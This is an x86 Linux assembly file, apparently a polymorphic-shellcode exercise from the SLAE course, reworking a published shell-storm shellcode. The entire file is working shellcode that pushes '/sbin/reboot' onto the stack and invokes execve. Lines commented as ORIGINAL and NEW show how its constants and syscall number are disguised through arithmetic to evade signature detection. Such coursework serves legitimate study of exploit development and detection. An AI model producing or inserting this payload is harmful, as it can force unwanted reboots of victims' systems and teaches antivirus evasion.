;slae-513
;http://shell-storm.org/shellcode/files/shellcode-69.php
; 46 bytes

global _start
section .text
_start:

    xor eax, eax
    push eax
    
    ;push 0x746f6f62; toob [ORIGINAL]
    mov esi, 0x746f6c59   ; [NEW]
    add si,  0x309        ; [NEW]
    mov dword [esp-4], esi; [NEW]
    sub esp, 4            ; [NEW]
    push 0x65722f6e  ; er/n [ORIGINAL]
    
    push 0x6962732f; ibs/[ORIGINAL]

    mov ebx, esp
    push eax; 0

    mov edx, esp
    push ebx

    mov ecx, esp
    mov al, 0xb; [ORIGINAL]
    mov al, 0x6; [NEW]
    add al, 0x5; [NEW] 11 = NR_execve

    int 0x80    